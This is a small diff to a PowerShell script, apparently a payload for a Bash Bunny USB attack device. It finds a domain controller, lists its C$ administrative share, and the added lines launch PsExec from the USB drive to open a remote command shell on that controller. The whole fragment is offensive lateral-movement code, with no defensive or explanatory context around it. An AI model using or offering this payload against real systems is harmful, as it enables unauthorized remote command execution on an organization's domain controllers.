@@ -19,3 +19,6 @@ $DC= Get-Content DC.txt
 $domain= (gwmi win32_computersystem).Domain
 $DCvar= "$DC.$domain"
 ls "\\$DCvar\C$"
+Start-Sleep 3
+cd ((gwmi win32_volume -f 'label=''BashBunny''').Name+'tools\')
+.\PsExec.exe -accepteula \\$DCvar cmd
